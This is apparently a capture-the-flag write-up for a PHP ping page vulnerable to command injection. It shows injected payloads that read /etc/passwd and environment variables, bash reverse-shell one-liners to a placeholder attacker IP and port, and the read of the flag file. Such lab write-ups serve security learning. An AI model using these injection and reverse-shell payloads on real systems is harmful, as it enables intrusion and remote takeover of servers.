# PONG
## The App
When opening the site, the following text appears:

```
Command executed: ping -c 2 127.0.0.1
```

The URL is `/index.php?host=127.0.0.1` which indicates that the IP or maybe more is controllable.

## Tried solutions & solution
I tried to set `host=127.0.0.1;cat /etc/passwd` which showed the content of the `/etc/passwd` file. This measn we can control the command and inject our own.

I then tried to inject `127.0.0.1;bash -c bash -i >& /dev/tcp/<attack-ip-with-netcat-open>/<attacker-netcat-port> 0>&1` as URL encoded payload to open a reverse shell but it didn't work.

I then tried `127.0.0.1;ls .` but it returned only `index.php`. 

`127.0.0.1;echo $PWD` shows, that the directory is `/var/www/html`. 

`127.0.0.1;env` showed:

```
PHP_INI_DIR=/usr/local/etc/php
HOME=/root
PHP_LDFLAGS=-Wl,-O1 -pie
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_VERSION=7.4.30
GPG_KEYS=42670A7FE4D0441C8E4632349E4FDC074A4EF02D 5A52880781F755608BF815FC910DEB46F53EA312
PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_ASC_URL=https://www.php.net/distributions/php-7.4.30.tar.xz.asc
PHP_URL=https://www.php.net/distributions/php-7.4.30.tar.xz
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PHPIZE_DEPS=autoconf 		dpkg-dev 		file 		g++ 		gcc 		libc-dev 		make 		pkg-config 		re2c
PWD=/var/www/html
PHP_SHA256=ea72a34f32c67e79ac2da7dfe96177f3c451c3eefae5810ba13312ed398ba70d
```
So no flag there.

`127.0.0.1;ls /root` showed nothing.

I tried multiple attempts to open a reverse shell but it didn't work (for example I tried `bash -i >& /dev/tcp/<ATTACKER-IP>/<ATTACKER-PORT> 0>&1` but no luck).

Okay, seems that only a Webshell works.

My attempts to open a reverse shell broke the container because I modified the PHP file so I had to restart it.

Then I tried to serch for the flag with the payload `ls /`. This revealed a `flag.txt` file entry which I could read by calling `cat /flag.txt`